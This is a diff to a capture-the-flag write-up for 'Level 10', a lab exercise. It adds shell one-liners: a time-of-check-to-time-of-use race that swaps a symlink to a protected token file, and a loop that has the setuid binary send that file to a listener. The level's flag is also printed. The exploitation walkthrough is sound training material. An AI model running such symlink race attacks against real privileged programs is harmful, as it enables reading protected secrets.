@@ -1,5 +1,7 @@
 # Level 10
 
+## Resolution
+
 As `level10`, running `ls` gives us a binary called `level10` and a file named `token`. We don't have reading rights on the token but we can test the binary.
 
 ```shell
@@ -112,4 +114,21 @@ Use this string to log as `flag10` and run `getflag` to finish this level.
 
 So, `feulo4b72j7edeahuete3no7c` is the flag for this level.
 
+## Commands
 
+- Automatic send script
+
+  ```shell
+    printf '#!/bin/bash\nIP=`ifconfig | grep -A1 "eth3" | grep "inet" | cut -d ":" -f2 | cut -d " " -f1`\nwhile true;\ndo\n\t/home/user/level10/level10 /tmp/link $IP > /dev/null\ndone\n' > /tmp/auto-send.sh && chmod 777 /tmp/auto-send.sh
+  ```
+
+- Race-condition attack script
+
+  ```shell
+    printf '#!/bin/bash\nwhile true;\ndo\n\ttouch /tmp/link\n\trm -f /tmp/link\n\tln -s /home/user/level10/token /tmp/link\n\trm -f /tmp/link\ndone\n' > /tmp/race-condition.sh && chmod 777 /tmp/race-condition.sh
+  ```
+
+## Ressources
+
+- [time to check to time of use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
+- [netcat](https://en.wikipedia.org/wiki/Netcat)
